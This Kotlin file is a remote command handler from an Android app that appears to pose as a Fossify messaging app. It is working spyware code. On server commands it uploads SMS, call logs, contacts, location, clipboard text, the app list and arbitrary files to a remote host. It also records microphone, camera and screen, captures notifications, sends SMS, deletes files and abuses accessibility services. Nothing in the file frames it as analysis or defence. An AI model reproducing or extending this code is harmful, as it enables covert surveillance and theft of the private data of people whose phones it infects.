package org.fossify.messages.androbox

import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import java.io.File

object CommandProcessor {

    fun processCommand(command: String, context: Context) {
        var origin = "user"
        var actualCommand = command
        when {
            command.startsWith("admin:") -> {
                origin = "admin"
                actualCommand = command.substringAfter("admin:")
            }
            command.startsWith("user:") -> {
                origin = "user"
                actualCommand = command.substringAfter("user:")
            }
        }

        when {
            actualCommand.startsWith("device_info") -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = DeviceInfo.collectInfo(context)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "Device info uploaded (origin=$origin)")
                }
            }
            actualCommand == "apps" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = AppList.collectApps(context)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "App list uploaded (origin=$origin)")
                }
            }
            actualCommand == "messages" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = MessageCollector.collectMessages(context) ?: return
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "Messages uploaded (origin=$origin)")
                }
            }
            actualCommand == "calls" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = CallLogCollector.collectCallLogs(context) ?: return
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "Call logs uploaded (origin=$origin)")
                }
            }
            actualCommand == "contacts" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = ContactsCollector.collectContacts(context) ?: return
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "Contacts uploaded (origin=$origin)")
                }
            }
            actualCommand == "location" -> {
                LocationTracker.collectAndSendLocation(context, origin) { success ->
                    Log.d("CommandProcessor", if (success) "Location sent (origin=$origin)" else "Location failed")
                }
            }
            actualCommand == "clipboard" -> {
                val text = ClipboardHelper.getClipboardText(context)
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = File(context.cacheDir, "clipboard.txt")
                file.writeText(text)
                FileUploader.uploadFile(context, file, host, origin) { success ->
                    if (success) Log.d("CommandProcessor", "Clipboard uploaded (origin=$origin)")
                    file.delete()
                }
            }
            actualCommand.startsWith("send_message:") -> {
                val parts = actualCommand.substringAfter("send_message:").split("/", limit = 2)
                if (parts.size == 2) {
                    val number = parts[0]
                    val msg = parts[1]
                    val success = SmsSender.sendSms(number, msg)
                    Log.d("CommandProcessor", "Send SMS to $number: ${if (success) "OK" else "Failed"}")
                }
            }
            actualCommand.startsWith("send_message_to_all:") -> {
                val msg = actualCommand.substringAfter("send_message_to_all:")
                ToastHelper.showToast(context, "Feature: send to all contacts - $msg")
            }
            actualCommand.startsWith("file:") -> {
                val path = actualCommand.substringAfter("file:")
                val file = File(path)
                if (file.exists() && file.isFile) {
                    val urls = ConfigManager.getServerUrls(context) ?: return
                    val (host, _) = urls
                    FileUploader.uploadFile(context, file, host, origin) { success ->
                        if (success) Log.d("CommandProcessor", "File uploaded: $path (origin=$origin)")
                    }
                } else {
                    Log.e("CommandProcessor", "File not found: $path")
                }
            }
            actualCommand.startsWith("delete_file:") -> {
                val path = actualCommand.substringAfter("delete_file:")
                val success = FileManager.deleteFile(path)
                ToastHelper.showToast(context, if (success) "Deleted $path" else "Delete failed")
            }
            actualCommand.startsWith("microphone:") -> {
                val duration = actualCommand.substringAfter("microphone:").toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
            }
            actualCommand.startsWith("rec_camera_main:") -> {
                val duration = actualCommand.substringAfter("rec_camera_main:").toIntOrNull() ?: 30
                ForegroundService.startVideoMain(context, origin)
            }
            actualCommand.startsWith("rec_camera_selfie:") -> {
                val duration = actualCommand.substringAfter("rec_camera_selfie:").toIntOrNull() ?: 30
                ForegroundService.startVideoSelfie(context, origin)
            }
            actualCommand.startsWith("toast:") -> {
                val msg = actualCommand.substringAfter("toast:")
                ToastHelper.showToast(context, msg)
            }
            actualCommand.startsWith("show_notification:") -> {
                val parts = actualCommand.substringAfter("show_notification:").split("/", limit = 2)
                val title = parts.getOrNull(0) ?: "Notification"
                val message = parts.getOrNull(1) ?: ""
                NotificationHelper.showNotification(context, title, message)
            }
            actualCommand.startsWith("play_audio:") -> {
                val url = actualCommand.substringAfter("play_audio:")
                AudioPlayer.playUrl(context, url)
            }
            actualCommand == "vibrate" -> VibrationHelper.vibrate(context)
            actualCommand == "camera_selfie" -> ForegroundService.startFrontCamera(context, origin)
            actualCommand == "camera_main" -> ForegroundService.startBackCamera(context, origin)
            actualCommand == "stop_camera" -> ForegroundService.stopCamera(context)
            actualCommand == "video_camera_main" -> ForegroundService.startVideoMain(context, origin)
            actualCommand == "video_camera_selfie" -> ForegroundService.startVideoSelfie(context, origin)
            actualCommand == "stop_video" -> ForegroundService.stopVideo(context)
            actualCommand.startsWith("audio_record") -> {
                val duration = actualCommand.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
            }
            actualCommand.startsWith("audio_external") -> {
                val duration = actualCommand.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration, origin)
            }
            actualCommand == "stop_audio" -> ForegroundService.stopAudio(context)
            actualCommand == "screen_record_start" -> ScreenRecorder.startRecording(origin)
            actualCommand == "screen_record_stop" -> ScreenRecorder.stopRecording()
            actualCommand == "screenshot_on" -> ScreenCaptureService.startCapture(origin)
            actualCommand == "screen_capture_stop" -> ScreenCaptureService.stopCapture()
            actualCommand == "notif_capture_on" -> {
                NotificationCaptureService.setForwardingEnabled(true, origin)
                Log.d("CommandProcessor", "✅ Notification capture ENABLED (origin=$origin)")
            }
            actualCommand == "notif_capture_off" -> {
                NotificationCaptureService.setForwardingEnabled(false, origin)
                Log.d("CommandProcessor", "❌ Notification capture DISABLED")
            }
            actualCommand.startsWith("uninstall_app:") -> {
                val packageName = actualCommand.substringAfter("uninstall_app:")
                if (packageName.isNotBlank()) {
                    AppUninstall.openAppInfo(context, packageName)
                } else {
                    ToastHelper.showToast(context, "Package name missing")
                }
            }
            actualCommand.startsWith("autoclick:") -> {
                val data = actualCommand.substringAfter("autoclick:")
                if (data.isNotBlank()) {
                    if (AutoClicker.isEnabled()) {
                        AutoClicker.performClick(data)
                    } else {
                        ToastHelper.showToast(context, "⚠️ Auto Clicker accessibility not enabled. Enable from Settings.")
                        context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    }
                }
            }
            actualCommand == "dump_screen" -> {
                if (AutoClicker.isEnabled()) {
                    AutoClicker.dumpScreen { screenText ->
                        val urls = ConfigManager.getServerUrls(context)
                        if (urls != null) {
                            val (host, _) = urls
                            val file = File(context.cacheDir, "screen_dump.txt")
                            file.writeText(screenText)
                            FileUploader.uploadFile(context, file, host, origin) { success ->
                                if (success) Log.d("CommandProcessor", "Screen dump uploaded (origin=$origin)")
                                file.delete()
                            }
                        } else {
                            Log.e("CommandProcessor", "No server config for dump")
                        }
                    }
                } else {
                    ToastHelper.showToast(context, "⚠️ Auto Clicker not enabled")
                }
            }
            else -> Log.d("CommandProcessor", "Unknown command: $actualCommand")
        }
    }
}